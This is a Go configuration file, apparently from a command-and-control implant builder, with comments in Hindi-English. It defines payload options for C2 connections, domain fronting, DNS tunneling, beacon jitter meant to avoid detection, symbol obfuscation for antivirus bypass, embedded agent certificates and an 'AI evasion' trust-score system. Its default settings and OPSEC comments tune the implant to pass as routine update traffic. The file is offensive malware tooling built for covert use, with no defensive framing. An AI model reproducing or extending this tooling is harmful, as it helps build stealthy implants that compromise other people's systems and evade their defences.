//config/config.go
package config

// PayloadConfig — user ke diye gaye saare options ek jagah
type PayloadConfig struct {

        // === Target OS / Architecture ===
        OS   string // windows / linux / darwin
        Arch string // amd64 / arm64 / 386

        // === C2 Connection ===
        Protocol string // mtls / http / https / dns
        C2Host   string // server ka IP ya domain
        C2Port   int    // server ka port

        // === Modern C2 Profile Fields ===
        UserAgent    string // HTTP/HTTPS ke liye custom User-Agent
        EncryptionKey string // Pre-Shared Key (PSK) for payload encryption

        // === Domain Fronting & DNS Tunneling ===
        FrontDomain     string // CDN domain for HTTPS domain fronting
        DNSTunnelDomain string // Base domain for DNS tunneling

        // === C2 Endpoint Path (for HTTPS behind Nginx/reverse proxy) ===
        C2EndpointPath string // e.g., "/api/v1/c2-endpoint"

        // === External Agent Cert (pre-existing, signed by your localCA) ===
        // When set, builder embeds these instead of generating new certs
        AgentCertPath string // path to fresh_agent.crt
        AgentKeyPath  string // path to fresh_agent.key

        // === Payload Format ===
        Format string // exe / shellcode / dll / service

        // === Beacon ya Session ===
        IsBeacon       bool
        BeaconInterval int // seconds — kitni der baad server ko call kare
        BeaconJitter   int // seconds — random delay (detection se bachne ke liye)

        // === Reconnect Settings ===
        ReconnectInterval   int // failed connection ke baad kitna wait kare
        MaxConnectionErrors int // kitni baar fail hone ke baad implant exit kare

        // === Obfuscation ===
        ObfuscateSymbols bool // package names random karo (AV bypass)
        Debug            bool // debug symbols rakho (development ke liye)

        // === Limits (Kill Switch) ===
        LimitHostname     string // sirf is machine pe chalo
        LimitUsername     string // sirf is user ke liye chalo
        LimitDatetime     string // is date ke baad exit karo (YYYY-MM-DD)
        LimitDomainJoined bool  // sirf domain-joined machine pe chalo

        // mTLS Certificate Material (PKI se auto-injected)
        // Builder in fields ko generated.go mein embed karta hai
        CACertPEM    string // CA cert — agent server ko verify karega isse
        AgentCertPEM string // Agent ka unique client cert
        AgentKeyPEM  string // Agent ka private key

        // === Cortex (AI Evasion Brain) Thresholds ===
        CortexInitialScore      int     // Starting trust score (default: 70)
        CortexCriticalThreshold int     // Below this = hibernate (default: 10)
        CortexLowThreshold      int     // Below this = max evasion (default: 40)
        CortexHighThreshold     int     // At/above this = normal ops (default: 80)
        CortexRecoveryRate      int     // Points gained per clean cycle (default: 2)
        CortexDecayRate         int     // Max points lost per detection (default: 15)
        CortexBaseJitterPct     float64 // Jitter % at high trust (default: 0.20)
        CortexMaxJitterPct      float64 // Jitter % at low trust (default: 0.50)

        // === Output ===
        OutputDir   string // kahan save karo
        PayloadName string // implant ka naam (empty = random)
}

// DefaultConfig — sane defaults jo user override kar sakta hai
//
// OPSEC: Beacon interval changed from 3s to 30s for stealth.
// 3s was too aggressive (machine-like pattern). 30s with 15s
// jitter looks like a normal background app checking for updates.
//
// For interactive sessions, user can override to 3-5s via GUI.
// For long-term stealth, keep 30s+ with high jitter.
func DefaultConfig() *PayloadConfig {
        return &PayloadConfig{
                OS:                    "windows",
                Arch:                  "amd64",
                Protocol:              "https",
                C2Port:                443,
                Format:                "exe",
                IsBeacon:              true,
                BeaconInterval:        30,  // 30 seconds — looks like update check
                BeaconJitter:          15,  // 50% jitter — human-like
                ReconnectInterval:     60,  // 1 minute on failure
                MaxConnectionErrors:   1000,
                ObfuscateSymbols:      false,
                Debug:                 false,
                UserAgent:             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
                EncryptionKey:         "",
                C2EndpointPath:        "/api/v1/c2-endpoint",
                OutputDir:             "./output",
                CortexInitialScore:    70,
                CortexCriticalThreshold: 10,
                CortexLowThreshold:    40,
                CortexHighThreshold:   80,
                CortexRecoveryRate:    2,
                CortexDecayRate:       15,
                CortexBaseJitterPct:   0.20,
                CortexMaxJitterPct:    0.50,
        }
}
